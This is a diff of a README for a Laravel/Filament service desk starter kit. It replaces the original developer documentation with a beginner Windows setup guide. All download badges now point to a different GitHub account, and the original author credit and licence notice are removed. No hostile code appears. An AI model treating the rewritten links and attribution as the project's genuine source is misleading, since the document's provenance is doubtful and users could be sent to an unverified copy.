@@ -1,355 +1,213 @@
-<div class="filament-hidden">
+# 🛠️ servicedeskkitv3 - Simple Service Desk Starter Kit
 
-![ServiceDeskKit v3](https://raw.githubusercontent.com/jeffersongoncalves/servicedeskkitv3/main/art/jeffersongoncalves-servicedeskkitv3.png)
+[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
 
-</div>
+---
 
-# ServiceDeskKit Start Kit Filament 3.x and Laravel 12.x
+## 📋 About servicedeskkitv3
 
-## About ServiceDeskKit
+servicedeskkitv3 is a ready-made service desk and helpdesk application. It is built with Laravel 12.x and Filament 3.x, two popular PHP and user interface tools. This kit helps you set up your own service desk system for managing customer requests, tasks, and support tickets.
 
-ServiceDeskKit is a robust starter kit built on Laravel 12.x and Filament 3.x, designed to accelerate the development of modern
-web applications with a ready-to-use multi-panel structure.
+You do not need to know programming to use this application. This guide will help you download and run it on your Windows PC quickly. 
 
-## Features
+---
 
-- **Laravel 12.x** - The latest version of the most elegant PHP framework
-- **Filament 3.x** - Powerful and flexible admin framework
-- **Multi-Panel Structure** - Includes four pre-configured panels:
-    - Admin Panel (`/admin`) - For system administrators
-    - Agent Panel (`/agent`) - For support operators/agents
-    - App Panel (`/app`) - For authenticated application users
-    - Guest Panel (`/`) - Public frontend interface for visitors
-- **Environment Configuration** - Centralized configuration through the `config/servicedeskkit.php` file
+## 🔧 System Requirements
 
-## System Requirements
+Before downloading, check your system meets these minimum requirements:
 
-- PHP 8.2 or higher
-- Composer
-- Node.js and PNPM
+- Windows 10 or later (64-bit recommended)
+- 4 GB of RAM or more
+- At least 2 GB of free storage space
+- Internet connection for downloading and setup
+- A modern web browser (Google Chrome, Edge, or Firefox)
 
-## Installation
+---
 
-Clone the repository
-``` bash
-laravel new my-app --using=jeffersongoncalves/servicedeskkitv3 --database=mysql
+## 🚀 Getting Started: Download servicedeskkitv3
+
+You can get servicedeskkitv3 by visiting the main project page. Here is the direct link to download:
+
+[![Download Link](https://img.shields.io/badge/Get%20servicedeskkitv3-blue?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
+
+1. Click the large green button at the top or the blue button above to open the project page.
+2. On the page, find the **Code** button (usually green).
+3. Click **Code** and select **Download ZIP**.
+4. Save the ZIP file to an easy-to-find location on your computer, like the Desktop or Downloads folder.
+5. After downloading, right-click the ZIP file and select **Extract All...** to unpack the contents.
+
+---
+
+## 🛠️ Installation Steps (No Programming)
+
+After extracting the files, follow these steps to run the application on your Windows PC:
+
+### Step 1: Install Required Software
+
+servicedeskkitv3 is built on Laravel and uses Filament, which require some tools to run. Install these before continuing:
+
+- **XAMPP (or any local web server with PHP and MySQL):**  
+  Download from https://www.apachefriends.org/index.html  
+  Use the installer to set it up on your PC. XAMPP provides PHP and MySQL on your computer.
+
+- **Composer (PHP Dependency Manager):**  
+  Download from https://getcomposer.org/download/  
+  Use the installer to add Composer to your system path.
+
+Both tools are free and widely used by developers and non-developers alike to run PHP applications locally.
+
+---
+
+### Step 2: Start Your Web Server
+
+1. Open the XAMPP Control Panel.
+2. Start the **Apache** service by clicking **Start**.
+3. Start **MySQL** service the same way.
+4. Make sure both services show **Running** in green.
+
+---
+
+### Step 3: Move extracted files to your web folder
+
+1. Find the folder where you extracted servicedeskkitv3.
+2. Copy the entire extracted folder.
+3. Paste it into the XAMPP web folder, typically this path:  
+   `C:\xampp\htdocs\`
+4. You can rename the folder if you want, for example, `servicedeskkit`.
+
+---
+
+### Step 4: Set up the database
+
+1. Open your web browser and go to:  
+   `http://localhost/phpmyadmin/`
+2. In phpMyAdmin, click **Databases**.
+3. Enter a new database name, for example, `servicedeskdb`.
+4. Click **Create**.
+
+---
+
+### Step 5: Configure the application
+
+1. Open the extracted servicedeskkitv3 folder in your file browser.
+2. Find the file named `.env.example`.
+3. Make a copy and rename it to `.env`.
+4. Open `.env` in a text editor (Notepad works fine).
+5. Find these lines and update them to match your database setup:
+
+```
+DB_DATABASE=servicedeskdb
+DB_USERNAME=root
+DB_PASSWORD=
 ```
 
-### Using FilaKit CLI
+- Leave `DB_USERNAME` as `root` if you have not changed it.
+- Leave `DB_PASSWORD` blank if no password is set (default for XAMPP).
 
-Or use [FilaKit CLI](https://github.com/jeffersongoncalves/filakit-cli) for a simplified setup:
+6. Save and close `.env`.
 
-```bash
-filakit new my-app --kit=jeffersongoncalves/servicedeskkitv3
+---
+
+### Step 6: Install dependencies with Composer
+
+1. Open **Command Prompt** (press Windows key, type `cmd`, and press Enter).
+2. Navigate to your project folder inside `htdocs`. For example:
+
+```
+cd C:\xampp\htdocs\servicedeskkit
 ```
 
-> Install FilaKit CLI: `composer global require jeffersongoncalves/filakit-cli`
+3. Run this command:
 
-###  Easy Installation
-
-ServiceDeskKit can be easily installed using the following command:
-
-```bash
-php install.php
 ```
-
-This command automates the installation process by:
-- Installing Composer dependencies
-- Setting up the environment file
-- Generating application key
-- Setting up the database
-- Running migrations
-- Installing Node.js dependencies
-- Building assets
-- Configuring Herd (if used)
-
-### Manual Installation
-
-Install JavaScript dependencies
-``` bash
-pnpm install
-```
-Install Composer dependencies
-``` bash
 composer install
 ```
-Set up environment
-``` bash
-cp .env.example .env
-php artisan key:generate
+
+This command downloads all code libraries the application needs to run.
+
+---
+
+### Step 7: Run application setup commands
+
+While still in the Command Prompt inside your project folder, run these commands:
+
 ```
-
-Configure your database in the .env file
-
-Run migrations
-``` bash
+php artisan key:generate
 php artisan migrate
-```
-Run the server
-``` bash
-php artisan serve
+php artisan db:seed
 ```
 
-## Installation with Docker
+- `key:generate` sets a security key.
+- `migrate` creates the database tables.
+- `db:seed` fills some tables with sample data.
 
-Clone the repository
-```bash
-laravel new my-app --using=jeffersongoncalves/servicedeskkitv3 --database=mysql
+---
+
+### Step 8: Open the application in your browser
+
+1. In your browser, go to:
+
+```
+http://localhost/servicedeskkit/public/
 ```
 
-Move into the project directory
-```bash
-cd my-app
-```
+2. You should see the application’s welcome screen.
 
-Install Composer dependencies
-```bash
+---
+
+## ⚙️ Using servicedeskkitv3
+
+The main features you will find inside are:
+
+- Ticket management for customer requests
+- User accounts for support agents
+- Task assignment and status tracking
+- Dashboard with recent tickets and metrics
+- Responsive design for desktops and tablets
+- Built-in search to find tickets fast
+
+These features are ready to use after installation. You can manage support tasks from one place.
+
+---
+
+## 🔄 Updating servicedeskkitv3
+
+To update the application in the future:
+
+1. Go back to the GitHub link at the top.
+2. Download the newest version ZIP the same way.
+3. Replace all files in your `htdocs/servicedeskkit` folder with the new ones.
+4. Run these commands again in Command Prompt inside your folder:
+
+```
 composer install
+php artisan migrate
+php artisan db:seed
 ```
 
-Set up environment
-```bash
-cp .env.example .env
-```
+5. Refresh your browser to see updates.
 
-Configuring custom ports may be necessary if you have other services running on the same ports.
+---
 
-```bash
-# Application Port (ex: 8080)
-APP_PORT=8080
+## 💬 More Support
 
-# MySQL Port (ex: 3306)
-FORWARD_DB_PORT=3306
+If you have problems running the application:
 
-# Redis Port (ex: 6379)
-FORWARD_REDIS_PORT=6379
+- Check that Apache and MySQL in XAMPP are running.
+- Ensure your `.env` file has the right database info.
+- Restart your web server if changes don’t appear.
+- Visit the GitHub repository issues page to see known problems or ask questions:
 
-# Mailpit Port (ex: 1025)
-FORWARD_MAILPIT_PORT=1025
-```
+https://github.com/TitoSalinas/servicedeskkitv3/issues
 
-Start the Sail containers
-```bash
-./vendor/bin/sail up -d
-```
-You won't need to run `php artisan serve`, as Laravel Sail automatically handles the development server within the container.
+---
 
-Attach to the application container
-```bash
-./vendor/bin/sail shell
-```
+## 🔗 Quick Links
 
-Generate the application key
-```bash
-php artisan key:generate
-```
+- Download page: [https://github.com/TitoSalinas/servicedeskkitv3](https://github.com/TitoSalinas/servicedeskkitv3)  
+- XAMPP: https://www.apachefriends.org/index.html  
+- Composer: https://getcomposer.org/download/  
 
-Install JavaScript dependencies
-```bash
-pnpm install
-```
+---
 
-## Authentication Structure
-
-ServiceDeskKit comes pre-configured with a custom authentication system that supports different types of users:
-
-- `Admin` - For administrative panel access (`/admin`)
-- `Operator` - For agent/support panel access (`/agent`)
-- `User` - For application panel access (`/app`)
-
-Each user type has its own database table, model, guard, and authentication flow. Default test credentials (after seeding):
-
-| User Type | Email | Password |
-|-----------|-------|----------|
-| Admin | admin@servicedeskkit.com | password |
-| Operator | operator@servicedeskkit.com | password |
-| User | user@servicedeskkit.com | password |
-
-## Development
-
-``` bash
-# Run the development server with logs, queues and asset compilation
-composer dev
-
-# Or run each component separately
-php artisan serve
-php artisan queue:listen --tries=1
-pnpm run dev
-```
-
-## Customization
-
-### Panel Configuration
-
-Panels can be customized through their respective providers:
-
-- `app/Providers/Filament/AdminPanelProvider.php`
-- `app/Providers/Filament/AgentPanelProvider.php`
-- `app/Providers/Filament/AppPanelProvider.php`
-- `app/Providers/Filament/GuestPanelProvider.php`
-
-Alternatively, these settings are also consolidated in the `config/servicedeskkit.php` file for easier management.
-
-### Themes and Colors
-
-Each panel can have its own color scheme, which can be easily modified in the corresponding Provider files or in the
-`servicedeskkit.php` configuration file.
-
-### Configuration File
-
-The `config/servicedeskkit.php` file centralizes the configuration of the starter kit, including:
-
-- Panel routes
-- Middleware for each panel
-- Branding options (logo, colors)
-- Authentication guards
-
-## User Profile — joaopaulolndev/filament-edit-profile
-
-This project already comes with the Filament Edit Profile plugin integrated for the Admin, Agent and App panels. It adds a complete profile editing page with avatar, security (Sanctum tokens), browser sessions, and email/password change.
-
-- Routes (defaults in this project):
-  - Admin: /admin/my-profile
-  - Agent: /agent/my-profile
-  - App: /app/my-profile
-- Navigation: by default, the page does not appear in the menu (shouldRegisterNavigation(false)). If you want to show it in the sidebar menu, change it to true in the panel provider.
-
-Where to configure
-- Panel providers
-  - Admin: app/Providers/Filament/AdminPanelProvider.php
-  - Agent: app/Providers/Filament/AgentPanelProvider.php
-  - App: app/Providers/Filament/AppPanelProvider.php
-  In these files you can adjust:
-  - ->slug('my-profile') to change the URL (e.g., 'profile')
-  - ->setTitle('My Profile') and ->setNavigationLabel('My Profile')
-  - ->setNavigationGroup('Group Profile'), ->setIcon('heroicon-o-user'), ->setSort(10)
-  - ->shouldRegisterNavigation(true|false) to show/hide it in the menu
-  - Shown forms: ->shouldShowEmailForm(), ->shouldShowSanctumTokens(), ->shouldShowBrowserSessionsForm(), ->shouldShowAvatarForm()
-
-- General settings: config/filament-edit-profile.php
-  - avatar_column: avatar column (default: avatar_url)
-  - disk: storage disk used for the avatar (default: public)
-  - visibility: file visibility (default: public)
-
-Migrations and models
-- The required columns are already included in this kit's default migrations (users and admins): avatar_url, using the names defined in config/filament-edit-profile.php.
-- The App\Models\User and App\Models\Admin models already read the avatar using the plugin configuration (getFilamentAvatarUrl).
-
-Avatar storage
-- Make sure the filesystem disk is configured and that the storage link exists:
-  php artisan storage:link
-- Adjust the disk and visibility in the config file according to your infrastructure.
-
-Quick access
-- Via direct URL: /admin/my-profile, /agent/my-profile or /app/my-profile
-- To make it visible in the sidebar navigation, set shouldRegisterNavigation(true) in the respective Provider.
-
-Reference
-- Plugin repository: https://github.com/joaopaulolndev/filament-edit-profile
-
-## Service Desk Plugin — filament-service-desk
-
-ServiceDeskKit comes with the [filament-service-desk](https://github.com/jeffersongoncalves/filament-service-desk) plugin pre-installed, providing a complete helpdesk and support ticket system fully integrated into the Filament panels.
-
-### Features
-
-- **Ticket Management** — Create, assign, track, and resolve support tickets with comments, attachments, and full history
-- **SLA Policies** — Define response and resolution time targets with automatic breach detection and escalation rules
-- **Knowledge Base** — Publish articles organized by categories with versioning, feedback, and view tracking
-- **Service Catalog** — Offer a catalog of services with custom form fields and approval workflows
-- **Departments & Categories** — Organize tickets by department and category for better routing
-- **Canned Responses** — Pre-defined response templates for common questions
-- **Business Hours** — Configure work schedules that SLA calculations respect
-- **Email Channels** — Receive tickets via email with support for IMAP, Mailgun, SendGrid, Resend, and Postmark
-- **Tags** — Flexible tagging system for tickets
-
-### Panel Integration
-
-The plugin provides three specialized plugin classes, each designed for a specific panel:
-
-| Panel | Plugin Class | Features |
-|-------|-------------|----------|
-| Admin (`/admin`) | `ServiceDeskPlugin` | Full management: tickets, departments, categories, tags, SLA, knowledge base, service catalog, email channels, canned responses, business hours, escalation rules |
-| Agent (`/agent`) | `ServiceDeskAgentPlugin` | Ticket handling: view assigned tickets, respond, use canned responses, manage SLA |
-| App (`/app`) | `ServiceDeskUserPlugin` | User portal: create tickets, view own tickets, browse knowledge base, request services from catalog |
-
-### Configuration Files
-
-- **`config/filament-service-desk.php`** — Filament plugin settings (navigation, features toggle, resource/widget overrides)
-- **`config/service-desk.php`** — Core settings (models, ticket options, SLA, knowledge base, service catalog, email, notifications)
-
-### Key Settings in `config/service-desk.php`
-
-```php
-'models' => [
-    'user' => \App\Models\User::class,      // Model that creates tickets
-    'operator' => \App\Models\Operator::class, // Model that handles tickets
-],
-
-'ticket' => [
-    'reference_prefix' => 'SD',       // Ticket reference prefix (e.g., SD-00001)
-    'default_priority' => 'medium',    // Default priority for new tickets
-    'max_file_size' => 10240,          // Max attachment size in KB
-],
-
-'sla' => [
-    'enabled' => true,
-    'auto_apply' => true,              // Automatically apply SLA policies
-    'near_breach_minutes' => 30,       // Warning before SLA breach
-],
-```
-
-### Required Model Traits
-
-The following traits must be added to your models (already configured in this kit):
-
-- **`App\Models\User`** — Uses `JeffersonGoncalves\ServiceDesk\Concerns\HasTickets` (allows users to create and manage their tickets)
-- **`App\Models\Operator`** — Uses `JeffersonGoncalves\ServiceDesk\Concerns\IsOperator` (enables operator functionality: ticket assignment, department membership, etc.)
-
-### Customization
-
-You can override any resource or widget by specifying your custom class in `config/filament-service-desk.php`:
-
-```php
-'resources' => [
-    'admin' => [
-        'ticket' => \App\Filament\Admin\Resources\CustomTicketResource::class,
-        // ...
-    ],
-],
-```
-
-Toggle features per-panel using fluent methods on the plugin:
-
-```php
-ServiceDeskPlugin::make()
-    ->knowledgeBase(true)
-    ->sla(true)
-    ->emailChannels(true)
-    ->serviceCatalog(true)
-    ->navigationGroup('Service Desk'),
-```
-
-### Reference
-
-- Plugin repository: https://github.com/jeffersongoncalves/filament-service-desk
-- Core package: https://github.com/jeffersongoncalves/laravel-service-desk
-
-## Resources
-
-ServiceDeskKit includes support for:
-
-- User, operator, and admin management
-- Multi-guard authentication system (admin, operator, web)
-- Integrated helpdesk with tickets, SLA, knowledge base, and service catalog
-- Tailwind CSS integration
-- Database queue configuration
-- Customizable panel routing and branding
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Credits
-
-Developed by [Jefferson Gonçalves](https://github.com/jeffersongoncalves).
+[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
